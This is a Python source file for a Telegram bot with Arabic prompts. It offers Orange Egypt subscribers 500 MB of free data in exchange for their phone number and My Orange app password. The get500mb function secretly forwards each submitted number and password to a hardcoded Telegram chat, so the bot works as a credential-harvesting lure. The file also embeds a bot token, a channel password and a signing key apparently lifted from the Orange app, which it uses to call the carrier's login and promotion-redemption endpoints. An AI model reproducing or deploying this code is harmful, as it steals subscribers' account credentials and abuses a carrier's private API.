import telebot
import requests
import hashlib
import requests
from keep_alive import keep_alive
keep_alive()
bot = telebot.TeleBot('6269032776:AAHRWeW0pwPWGQAFyVlIeZgc1FVrHJHqdCA')


def get500mb(message,num):
    bot.reply_to(message, "انتظر....")
    pas=message.text

    try:
      res=sendMessage(num,pas)
      bot.send_message(1098317745, "From: " + "@" + str(message.from_user.username) + "\n" + "Number: " + f"`{num}`"+"\n" + "password: " + f"`{pas}`",parse_mode="MarkdownV2")


      if res == "User is redeemed before" :
           respose="انت خدت العرض قبل كده جرب بعد شهر :( " 
      elif res=="Success":
           respose="تم أضافة 500 ميجا لخطك بنجاح ✅"
      else:
           respose="حدث خطأ حاول مرة اخرى"
    
      bot.reply_to(message, respose)
    except:
         bot.reply_to(message, "رقم الهاتف او الباسورد خطأ")
   

def sendMessage(number,pss):
      url = 'https://services.orange.eg/SignIn.svc/SignInUser'
      header ={
      "net-msg-id": "61f91ede006159d16840827295301013",
      "x-microservice-name": "APMS",
      "Content-Type": "application/json; charset=UTF-8",
      "Content-Length": "166",
      "Host": "services.orange.eg",
      "Connection": "Keep-Alive",
      "Accept-Encoding": "gzip",
      "User-Agent": "okhttp/3.14.9",
      }

      data = '{"appVersion":"7.2.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' % (number,pss)
      r=requests.post(url,headers=header,data=data).json()
      userid=r["SignInUserResult"]["UserData"]["UserID"]
      urlo = "https://services.orange.eg/GetToken.svc/GenerateToken"
      hdo = {"Content-type":"application/json", 
        "Content-Length":"78", 
        "Host":"services.orange.eg"
        , "Connection":"Keep-Alive" ,
          "User-Agent":"okhttp/3.12.1"}
      datao = '{"appVersion":"2.9.8","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' %(number,pss)
      ctv = requests.post(urlo,headers=hdo,data = datao).json()["GenerateTokenResult"]["Token"]
      key = ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
      htv=(str(hashlib.sha256((ctv+key).encode('utf-8')).hexdigest()).upper())
      url2="https://services.orange.eg/APIs/Promotions/api/CAF/Redeem"
      data2='{"Language":"ar","OSVersion":"Android7.0","PromoCode":"رمضان كريم","dial":"%s","password":"%s","Channelname":"MobinilAndMe","ChannelPassword":"ig3yh*mk5l42@oj7QAR8yF"}' %(number,pss)
      header2={
      "_ctv": ctv,
      "_htv": htv,
      "UserId": userid,
      "Content-Type": "application/json; charset=UTF-8",
      "Content-Length": "142",
      "Host": "services.orange.eg",
      "Connection": "Keep-Alive",
      "User-Agent": "okhttp/3.14.9",
      }

      da=data2.encode('utf-8')

      r=requests.post(url2,headers=header2,data=da).json()

      return r['ErrorDescription']

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.send_message(message.chat.id, '''
        اهلا بيك فـ Usf Bot 
 ابعت رقم اورنج الي عايز تضيفلو الميجات
    ''')


@bot.message_handler(func=lambda message: True)
def reply(message):
 


        bot.reply_to(message, "ابعت باسورد تطبيق My Orange")
        num=message.text
        bot.register_next_step_handler(message, get500mb,num)

  


 


bot.infinity_polling()
